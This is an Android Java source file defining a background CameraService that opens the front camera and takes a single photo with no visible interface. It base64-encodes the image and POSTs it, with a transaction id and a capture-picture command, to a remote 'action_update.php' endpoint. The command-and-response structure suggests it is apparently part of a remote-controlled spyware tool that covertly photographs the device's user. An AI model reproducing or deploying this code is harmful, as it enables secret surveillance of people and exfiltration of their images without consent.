package cis.pintu;

import android.Manifest;
import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.ImageFormat;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.media.Image;
import android.media.ImageReader;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.support.annotation.NonNull;
import android.support.v4.content.ContextCompat;
import android.util.Log;

import org.json.JSONObject;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.nio.ByteBuffer;
import java.util.Arrays;


public class CameraService extends Service {
    protected static final String TAG = "VideoProcessing";
    protected static final int CAMERACHOICE = CameraCharacteristics.LENS_FACING_FRONT;
    protected CameraDevice cameraDevice;
    protected CameraCaptureSession session;
    protected ImageReader imageReader;

    protected CameraDevice.StateCallback cameraStateCallback = new CameraDevice.StateCallback() {

        @Override
        public void onOpened(@NonNull CameraDevice camera) {
            Log.i(TAG, "CameraDevice.StateCallback onOpened");
            cameraDevice = camera;
            new Handler().postDelayed(new Runnable() {
                @Override
                public void run() {
                    actOnReadyCameraDevice();
                }
            },1000);

        }

        @Override
        public void onDisconnected(@NonNull CameraDevice camera) {
            Log.w(TAG, "CameraDevice.StateCallback onDisconnected");
        }

        @Override
        public void onError(@NonNull CameraDevice camera, int error) {
            Log.e(TAG, "CameraDevice.StateCallback onError " + error);
        }
    };

    protected CameraCaptureSession.StateCallback sessionStateCallback = new CameraCaptureSession.StateCallback() {
        @Override
        public void onConfigured(@NonNull CameraCaptureSession session) {
            Log.i(TAG, "CameraCaptureSession.StateCallback onConfigured");
            CameraService.this.session = session;
            try {
                session.setRepeatingRequest(createCaptureRequest(), null, null);
            } catch (CameraAccessException e){
                Log.e(TAG, e.getMessage());
            }
        }

        @Override
        public void onConfigureFailed(@NonNull CameraCaptureSession session) {}
    };

    protected ImageReader.OnImageAvailableListener onImageAvailableListener = new ImageReader.OnImageAvailableListener() {
        @Override
        public void onImageAvailable(ImageReader reader) {
            Log.i(TAG, "onImageAvailable");
            try {
                Image img = reader.acquireLatestImage();
                if (img != null) {
                    processImage(img);
                    img.close();
                }
            }catch (Exception er){
                er.printStackTrace();
            }
        }
    };

    public void readyCamera()
    {
        CameraManager manager = (CameraManager) getSystemService(CAMERA_SERVICE);
        try {
            if ( ContextCompat.checkSelfPermission(this,
                    Manifest.permission.CAMERA)!= PackageManager.PERMISSION_GRANTED && Build.VERSION.SDK_INT>=23) {
                return;
            }

            String pickedCamera = getCamera(manager);
            manager.openCamera(pickedCamera, cameraStateCallback, null);
            imageReader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 1 /* images buffered */);
            imageReader.setOnImageAvailableListener(onImageAvailableListener, null);
            Log.i(TAG, "imageReader created");

        } catch (CameraAccessException e){
            Log.e(TAG, e.getMessage());
        }
    }


    /**
     *  Return the Camera Id which matches the field CAMERACHOICE.
     */
    public String getCamera(CameraManager manager){
        try {
            for (String cameraId : manager.getCameraIdList()) {
                CameraCharacteristics characteristics = manager.getCameraCharacteristics(cameraId);
                int cOrientation = characteristics.get(CameraCharacteristics.LENS_FACING);
                if (cOrientation == CAMERACHOICE) {
                    return cameraId;
                }
            }
        } catch (CameraAccessException e){
            //e.printStackTrace();
        }
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        readyCamera();
    }

    private String txid="";
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.i(TAG, "onStartCommand flags " + flags + " startId " + startId);
        if (intent!=null){
            txid=intent.getStringExtra("txid");
        }
        return START_NOT_STICKY;
    }

    public void actOnReadyCameraDevice()
    {
        try {
            cameraDevice.createCaptureSession(Arrays.asList(imageReader.getSurface()), sessionStateCallback, null);
        } catch (CameraAccessException e){
            Log.e(TAG, e.getMessage());
        }
    }

    private void stopCapture(){
        try {
            if (session!=null) {
                session.abortCaptures();
                session.close();
            }
        } catch (Exception e){
            Log.e(TAG, e.getMessage());
        }

    }

    @Override
    public void onDestroy() {
                stopCapture();
    }

    /**
     *  Process image data as desired.
     */
    private void processImage(Image image){
        //Process image data
        try {
            if (image!=null) {
                ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                byte[] bytes = new byte[buffer.capacity()];
                buffer.get(bytes);
                //for testing only
                    if (txid.equals(""))
                    txid=System.currentTimeMillis()+"";

                    JSONObject data=new JSONObject();
                    data.put("img",PintuManager.getInstance().encodeImage(bytes));
                    //SaveImg(bytes,Helper.checkFile(txid+".jpg"));
                    sendResp(txid,Constants.CMD_CAPTURE_PICTURE,data);
                    stopCapture();
            }
        } catch (Exception e) {
            //e.printStackTrace();
        }
    }

    private void SaveImg(byte[] bytes, File file) throws IOException {
        OutputStream output = null;
        try {
            output = new FileOutputStream(file);
            BitmapFactory.decodeByteArray(bytes,0,bytes.length).compress(Bitmap.CompressFormat.JPEG,90,output);
            //output.write(bytes);
        } finally {
            if (null != output) {
                output.flush();
                output.close();
            }
        }
        try {
            stopCapture();
            stopSelf();
        }catch (Exception er){}
    }

    protected CaptureRequest createCaptureRequest() {
        try {
            CaptureRequest.Builder builder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
            builder.addTarget(imageReader.getSurface());
            return builder.build();
        } catch (CameraAccessException e) {
            Log.e(TAG, e.getMessage());
            return null;
        }
    }

    private void sendResp(String txid,String command,JSONObject result){
        try {
            JSONObject data=new JSONObject();
            data.put("txid",txid);
            data.put("cmd",command);
            data.put("time",System.currentTimeMillis()+"");
            data.put("result",result.toString());
            new NR(Helper.baseurl+"action_update.php", 8000, "POST", data.toString(), this).networkRequest(new ResultCallback() {
                @Override
                public void onSuccess(String result) {
                    // Log.d("result",result);
                }
                @Override
                public void onError(String result) {
                    //  Log.d("result",result);
                }
            });
        }catch (Exception er){}
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}